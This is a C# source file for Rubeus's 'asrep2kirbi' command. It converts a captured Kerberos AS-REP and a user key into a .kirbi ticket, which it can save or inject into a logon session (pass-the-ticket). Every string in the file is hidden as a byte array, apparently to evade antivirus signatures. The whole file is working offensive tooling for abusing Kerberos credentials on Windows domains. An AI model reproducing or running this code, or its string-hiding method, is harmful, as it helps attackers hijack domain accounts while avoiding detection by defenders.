using System;
using System.Collections.Generic;
using System.IO;
using Asn1;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class ASREP2Kirbi : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 97, 115, 114, 101, 112, 50, 107, 105, 114, 98, 105 });

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine(S(new byte[] { 13, 10, 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 65, 83, 45, 82, 69, 80, 32, 116, 111, 32, 75, 105, 114, 98, 105 }));

            AsnElt asrep = null;
            byte[] key = null;
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1; //default if non /enctype is specified
            bool ptt = false;
            string outfile = S(new byte[] {});
            LUID luid = new LUID();

            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
            {
                outfile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 116, 116 })))
            {
                ptt = true;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 108, 117, 105, 100 })))
            {
                try
                {
                    luid = new LUID(arguments[S(new byte[] { 47, 108, 117, 105, 100 })]);
                }
                catch
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 73, 110, 118, 97, 108, 105, 100, 32, 76, 85, 73, 68, 32, 102, 111, 114, 109, 97, 116, 32, 40 }) + arguments[S(new byte[] { 47, 108, 117, 105, 100 })] + S(new byte[] { 41, 13, 10 }));
                    return;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 97, 115, 114, 101, 112 })))
            {
                string buffer = arguments[S(new byte[] { 47, 97, 115, 114, 101, 112 })];

                if (Helpers.IsBase64String(buffer))
                {
                    byte[] bufferBytes = Convert.FromBase64String(buffer);

                    asrep = AsnElt.Decode(bufferBytes);
                }
                else if (File.Exists(buffer))
                {
                    byte[] bufferBytes = File.ReadAllBytes(buffer);
                    asrep = AsnElt.Decode(bufferBytes);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 97, 115, 114, 101, 112, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 65, 83, 45, 82, 69, 80, 32, 109, 101, 115, 115, 97, 103, 101, 13, 10 }));
                    return;
                }
            }
            else
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 65, 32, 47, 97, 115, 114, 101, 112, 58, 88, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 33, 13, 10 }));
                return;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 107, 101, 121 })))
            {
                if (Helpers.IsBase64String(arguments[S(new byte[] { 47, 107, 101, 121 })]))
                {
                    key = Convert.FromBase64String(arguments[S(new byte[] { 47, 107, 101, 121 })]);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 107, 101, 121, 58, 88, 32, 109, 117, 115, 116, 32, 98, 101, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 99, 108, 105, 101, 110, 116, 32, 107, 101, 121, 13, 10 }));
                    //return;
                }
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 107, 101, 121, 104, 101, 120 })))
            {
                key = Helpers.StringToByteArray(arguments[S(new byte[] { 47, 107, 101, 121, 104, 101, 120 })]);
            }
            else
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 65, 32, 47, 107, 101, 121, 58, 88, 32, 111, 114, 32, 47, 107, 101, 121, 104, 101, 120, 58, 88, 32, 109, 117, 115, 116, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 33, 13, 10 }));
                return;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 })))
            {
                string encTypeString = arguments[S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 })].ToUpper();

                if (encTypeString.Equals(S(new byte[] { 82, 67, 52 })) || encTypeString.Equals(S(new byte[] { 78, 84, 76, 77 })))
                {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 49, 50, 56 })))
                {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 50, 53, 54 })) || encTypeString.Equals(S(new byte[] { 65, 69, 83 })))
                {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 68, 69, 83 })))
                {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }

            Ask.HandleASREP(asrep, encType, Helpers.ByteArrayToString(key), outfile, ptt, luid, false, true);
        }
    }
}